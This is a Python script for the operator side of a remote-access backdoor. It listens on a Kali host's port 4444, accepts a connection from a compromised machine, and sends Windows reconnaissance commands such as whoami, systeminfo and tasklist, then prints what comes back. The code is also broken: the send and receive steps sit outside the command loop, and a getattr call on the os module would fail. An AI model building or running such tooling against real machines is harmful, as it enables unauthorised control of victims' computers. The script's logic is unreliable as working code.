import socket 
import os

SERVER_HOST = "192.168.1.5" # This should be your kali ip
SERVER_PORT = 4444 #put your port

server = socket.socket()
server.bind((SERVER_HOST,SERVER_PORT))
print("[+]Server is listening on {}:{}".format(*server.getsockname()))
print('[+] Listening for Client Connection ...')
server.listen(1)
client,client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the sever')


#Available command
commands = {
    "ipconfig" : "Check client IP address",
    "dir"   : "List directory contents",
    "tasklist" : "list current running process",
    "systeminfo" : "Show system information",
    "netstat"   : "Print network connections",
    "whoami"    : "Print current user info"
}

#Print out the available command 
print("Available command")
for key, value in commands.items():
    print(f"{key} : {value}")

while True:
    # Get the user command choice
    command = input("\n Enter a command (type '-help' for options):")
    if command == "-help":
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Available command")
        for key, value in commands.items():
            print(f"\t{key} : {value}")
        continue
    elif command in commands:
        cmd_func = getattr(os,command)

#Verify the command is valid 
if command not in commands.keys():
    print('\n[-] Invalid Command!')
    

#Sent the command to client
command = command.encode()
client.send(command)
print('\n[+] Command Sent\n')

#Receive the output from the client and print it out
output = client.recv(4096).decode()
os.system('cls' if os.name == 'nt' else 'clear')
print(f"Output : {output}")